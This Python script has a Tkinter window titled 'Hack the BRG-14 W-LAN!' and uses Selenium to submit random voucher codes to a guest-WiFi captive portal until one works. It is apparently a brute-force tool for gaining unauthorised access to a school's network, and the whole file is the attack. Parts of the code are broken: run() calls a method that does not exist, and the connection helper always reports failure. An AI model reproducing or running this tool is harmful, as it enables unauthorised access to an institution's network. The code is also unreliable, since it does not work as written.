import tkinter as tk
import threading
import selenium
from selenium import webdriver
import socket
import random
import os
import asyncio


class Hacker(threading.Thread):
    logins = 0
    hacking_is_on = False

    def __init__(self):
        super().__init__()
        self.local_ip = socket.gethostbyname(socket.gethostname())
        print(f"Your local IP address: {self.local_ip}")
        self.url = "http://172.20.0.9:8880/guest/s/default/?ap=68:d7:9a:21:02:9e&ec=q5RnRZcmnZX8X5S2EmOsFNCSVjFzCqvszOBqtWcORTv1E_wVvC-r-QFCp70riXKZljJF_kQ8lm8lE0YqmfylI96Wu0_JzK5XFMvA2b4ylzb-DzrIgIwNVradqylgoaimIZ6aXC9-Y4FvJ4UYGBilubEUx_LtXVPHXdU9x6vdkrwQn2z1jQNucpOq8YO_6Ff7#/"
        self.driver = webdriver.Chrome('./chromedriver')
        self.active_voucher = None
        self.used_vouchers = []

    def get_random_voucher(self):
        voucher = str(random.randint(0, 99999)) + "-" + str(random.randint(0, 99999))
        while voucher in self.used_vouchers or len(voucher) < 11:
            voucher = str(random.randint(0, 99999)) + "-" + str(random.randint(0, 99999))
        self.used_vouchers.append(voucher)
        return voucher

    @staticmethod
    def connect_to_wlan():  # currently not working...
        try:
            os.system('netsh wlan set hostednetwork mode=allow ssid="" key=""')
        finally:
            print("Connection failed! Please connect manually.")

    async def login(self, voucher):
        self.driver.get(self.url)
        self.driver.find_element_by_name("voucherCode").send_keys(voucher)
        self.driver.find_element_by_class_name("busyToggle__body").click()

    async def full_login(self, voucher):
        try:
            await asyncio.wait_for(self.login(voucher), timeout=3)
        except asyncio.TimeoutError:
            print("Timeout!")

    def hack(self, window):
        self.active_voucher = self.get_random_voucher()
        try:
            asyncio.run(self.full_login(self.active_voucher))
        except selenium.common.exceptions.WebDriverException:
            print("Login failed due to exception!")
        finally:
            self.logins += 1
            window.refresh()
            if self.url != self.driver.current_url:
                print("Logged in successfully!")
                print("valid voucher: " + self.active_voucher)
            else:
                print(f"Login with voucher {self.active_voucher} failed!")

        print("Finished with success!")

    def run(self):
        self.full_hack()


class Window(Hacker, tk.Tk):
    def __init__(self):
        Hacker.__init__(self)
        tk.Tk.__init__(self)
        self.title('Hack the BRG-14 W-LAN!')
        self.geometry('300x100')
        self.configure(background='#ffffff')
        self.iconbitmap(bitmap="C:/Users/mkspf/OneDrive - brg14.at/coding/python/hack_the_wifi/images/wlan_light.ico")

        self.frame1 = tk.Frame(self)
        self.frame1.pack(side=tk.LEFT, expand=True)

        self.label1 = tk.Label(self, text=f"Attempts: {Hacker.logins}")
        self.label1.pack(side=tk.RIGHT, expand=True)

        self.button1 = tk.Button(self.frame1, text="start", command=self.start_hacking, background="green")
        self.button1.pack()

    def refresh(self):
        self.label1.config(text=f"Attempts: {Hacker.logins}")

    def start_hacking(self):
        Hacker.hacking_is_on = True
        self.start()
        self.button1.config(text="stop", command=self.stop_hacking, background="red")

    def stop_hacking(self):
        Hacker.hacking_is_on = False
        self.button1.config(text="start", command=self.start_hacking, background="green")


if __name__ == "__main__":
    W = Window()
    W.mainloop()
